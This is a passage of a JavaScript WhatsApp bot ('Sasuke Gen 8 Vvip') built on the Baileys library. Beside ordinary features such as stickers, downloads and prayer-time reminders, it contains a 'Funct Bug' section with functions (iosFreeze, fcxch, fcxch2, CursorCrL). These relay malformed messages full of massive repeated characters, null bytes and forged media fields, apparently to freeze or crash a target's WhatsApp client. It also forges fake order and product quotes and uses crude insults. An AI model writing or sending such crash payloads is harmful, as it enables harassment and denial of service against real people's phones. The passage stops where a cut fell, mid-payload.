/*

 Base Sasuke Gen 8 Vvip Erlangga Official New Eraa!!🐉〽️
 Instagram : @errlngggaaa.rr
 Github : https://github.com/erlangga050809
 Telegram : t.me/langgxyz2
 
  ( don't delete the creator's name, please respect it!! )
  
            Kata Kata Hari Ini
      - "Bila kegagalan itu hujan, dan keberhasilan bagaikan matahari, maka butuh keduanya untuk melihat pelangi"
      
      - "Kesuksesan berawal dari misi dan tantangan, bukan berawal dari zona nyaman"
  
      ~Erlangga 12/04/2025
*/

require('../start/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const yts = require('yt-search');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const JsConfuser = require("js-confuser");
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const fetch = require('node-fetch');
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { Client } = require('ssh2');
const crypto = require('crypto');
const makeid = crypto.randomBytes(3).toString('hex')
const { Sticker } = require("wa-sticker-formatter");

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WAlanggxyzet, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = langgxyz = async (langgxyz, m, chatUpdate, store) => {
    try {
    if (global.db.data == null) await loadDatabase();
        require('../assest/schema')(m);

        const chats = global.db.data.chats[m.chat];
        const users = global.db.data.users[m.sender];
        const settings = global.db.data.settings;
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
 const getQuoted = (m.quoted || m)      
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        
        const sender = m.key.fromMe ? langgxyz.user.id.split(":")[0] + "@s.whatsapp.net" || langgxyz.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa

        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./assest/database/premium.json"))
        const creator = JSON.parse(fs.readFileSync("./assest/database/owner.json"))
        const reseller = JSON.parse(fs.readFileSync("./assest/database/premium.json"))
        const contacts = JSON.parse(fs.readFileSync('./assest/database/contacts.json'))
        const antidel = JSON.parse(fs.readFileSync('./assest/database/antidel.json'))
        const botNumber = await langgxyz.decodeJid(langgxyz.user.id);
        const isPremium = premium.includes(m.sender)
        const isReseller = reseller.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const autodelete = from && isCmd ? antidel.includes(from) : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...creator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ");
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await langgxyz.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
            const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('../assest/myfunction');
        
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, delay, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('../assest/scraper');

 const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../assest/exif')  

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   --> Tanggal: ${new Date().toLocaleString()} \n` +
                    `   --> Pesan: ${m.body || m.mtype} \n` +
                    `   --> Pengirim: ${pushname} \n` +
                    `   --> JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   --> Grup: ${groupName} \n` +
                        `   --> GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            langgxyz.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
const imageUrls = [
        'https://files.catbox.moe/52f13z.png',
        'https://files.catbox.moe/52f13z.png',
        'https://files.catbox.moe/52f13z.png'
    ]; 
    
    // Randomized Image © Erlangga
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
        const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//END       
        langgxyz.ments = async (text) => {
    return [m.sender];
};



  // Thumb Bot          
const cihuy = fs.readFileSync('./assest/allmedia/erlangga.jpg')
const marga = fs.readFileSync('./assest/allmedia/erlangga2.jpg')
const poto = fs.readFileSync('./assest/allmedia/erlangga2.jpg')

// Fake Qouted
const qmime = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Dayzx Official`,jpegThumbnail: await rsz(poto, 200, 200) }}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ErlanggaOfficial`,jpegThumbnail: ""}}}

const qchannel = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ErlanggaOfficial`,jpegThumbnail: ""}}}

const erlangga = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
    },
    message: {
        productMessage: {
            product: {
                title: `Black Thunder Gen8Vvip`,
                description: `${pushname} order`,
                currencyCode: "IDR",
                priceAmount1000: "1000000000000",
                retailerId: `Dayzx Official`,
                productImageCount: 1,
                productImage: {
                    mimetype: "image/jpeg",
                    jpegThumbnail: await getBuffer("https://files.catbox.moe/52f13z.png") // Ambil gambar sebagai buffer
                }
            },
            businessOwnerJid: `0@s.whatsapp.net`,
        },
    },
};
		
		const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: "https://files.catbox.moe/52f13z.png",
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": fs.readFileSync('./assest/allmedia/erlangga2.jpg'),
					"thumbnailUrl": "https://files.catbox.moe/52f13z.png",
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "© Dayzx Offcial",
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}
		
		const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Black Thunder Gen1 Vvip`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282137392620:+62 821-3739-2620\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363418898701072@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By Dayzx Official`,
inviteExpiration: Date.now() + 1814400000
}
}}
// total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("../start/erlangga.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        	
	// END
const ErlanggaReply = (teks) => {
langgxyz.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `Black Thunder Gen 1`,
"body": `Hai ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://files.catbox.moe/52f13z.png',
"sourceUrl": 'https://instagram.com/errlngggaa.rr'}}},
{ quoted: qchannel})
}

const Reply = async (teks) => {
return langgxyz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "Black Thunder Gen 1 Vvip", 
body: `© Dayzx Developer`, 
thumbnailUrl: global.reply, 
sourceUrl: null, 
}}}, {quoted: PayX })
}

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

const nomerCreator =
[
'6282122680598@s.whatsapp.net',
'6282122680598@s.whatsapp.net'
] 
//debug
    async function SasukeDebug(Quoted){
    ErlanggaReply(`${JSON.stringify(Quoted, null, 2)}`)
    }

// Balasan Untuk Case Yang Tidak Sesuai
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('./start/erlangga.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err); //tangani Eror
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
let buttons = [
        { buttonId: `${mean}`, buttonText: { displayText: `${mean}` } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/52f13z.png", 
            gifPlayback: true 
        },
        caption: response,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "12036341889801072@newsletter",
                newsletterName: `Channel Dayzx Developer ͤ͛`
            }
        },
        footer: "© Dayzx Official",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}}
  
//Done Resp
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `
 𝚂𝚞𝚌𝚌𝚎𝚜 𝚜𝚎𝚗𝚍 𝚋𝚞𝚐 𝚝𝚘 𝚃𝚊𝚛𝚐𝚎𝚝!
*${command}* Sent To : 
 ${pepec}

⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀🎭〽️` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐦𝐞𝐧𝐮" } }
    ];

    let buttonMessage = {
        image: marga,
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "12036340905020546@newsletter",
                newsletterName: "𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐃𝐚𝐲𝐳𝐱"
            }
        },
        footer: "© Dayzx Developer",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: qmime });
}     

// Database 
        if (chats.antilink) {
            if (budy.includes('chat.whatsapp.com')) {
                if (isAdmins || isCreator) return;
                ErlanggaReply(`GROUP LINK DETECTOR\n\nsepertinya kamu mengirimkan link grup, maaf, pesan tersebut saya hapus`);
                if (!isBotAdmins) return ErlanggaReply(`bot bukan admin`);
                let gclink = `https://chat.whatsapp.com/${await langgxyz.groupInviteCode(m.chat)}`;
                if (budy.includes(gclink)) return;
                await langgxyz.sendMessage(m.chat, {
                    delete: m.key
                });
            }
          }
          
// Owner Offf
//========= SETTING EVENT ========//
if (global.owneroff && !isCmd) {
if (!isGroup && !isCreator) {
let teks = `*Hai Sukicau😜* @${m.sender.split('@')[0]}

Sori Le *Owner Gua Sedang Offline*, Silahkan Lu Tunggu Dulu Aja Owner Kembali Online & Jangan Spam Chat Ya Anak Memek`
return langgxyz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./assest/allmedia/modeowner.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

if (autodelete) {
langgxyz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.key.id,
participant: m.key.participant
}
})
}
// FFUNC STIKER
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

const capital = (string) => {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
        
async function makeStickerFromUrl(imageUrl, langgxyz, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await langgxyz.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Thunder Crash`,
                    body: `Dayzx Developer `,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: "https://files.catbox.moe/52f13z.png", 
                    sourceUrl: `https://t.me/DayzxOfficial1`
                }
            }
        }, { quoted: qmime });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ErlanggaReply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

 async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
 // Qc
 langgxyz.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await langgxyz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
let ppuser
           try {
           ppuser = await langgxyz.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = 'https://files.catbox.moe/52f13z.png'
           }
           
// FUNC HARI
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
// Auto Sholat
langgxyz.autoshalat = langgxyz.autoshalat ? langgxyz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? langgxyz.user.id : m.sender
	let id = m.chat 
    if(id in langgxyz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:50',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '18:16',
    isya: '19:27',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak 👋${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`
    langgxyz.autoshalat[id] = [
    ErlanggaReply(caption),
    setTimeout(async () => {
    delete langgxyz.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }   
// Funct Bug Dayzx Kasep

async function iosFreeze(target, Ptcp = true) {
   let anjayalokmwkakaakak = "palabapakkau" + "ြ".repeat(25000) + "@1".repeat(60000);
   await langgxyz.relayMessage(target, {
         messages: {
            Exentedtextmesage: {
               message: {
                  documentMessage: {
                     url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                     mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                     fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                     fileLength: "999999999",
                     pageCount: 0x9184e729fff,
                     mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                     fileName: "NtahMengapa..",
                     fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                     directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                     mediaKeyTimestamp: "1715880173",
                     contactVcard: true
                  },
                  title: "",
                  hasMediaAttachment: true
               },
               body: {
                  text: anjayalokmwkakaakak
               },
               nativeFlowMessage: {},
               contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "0@newsletter"),
          }
         }
      }
   }, { participant: { jid: mentionedJid, target } }, { messageId: null });
}

async function fcxch(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await langgxyz.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
async function fcxch2(target) {
    await langgxyz.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "XxX"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "review_order",
                                    buttonParamsJson: "\u0000".repeat(99999)
                                }
                            ]
                        }
                    }
                }
            }
        },
        {},
        { messageId: null }
    );
}

async function CursorCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '🩸 𝐃͠𝐚̻𝐲͢𝐳ͯ𝐱̻ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: ""
                },
                footer: {
                  text: "Yuukey Da"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
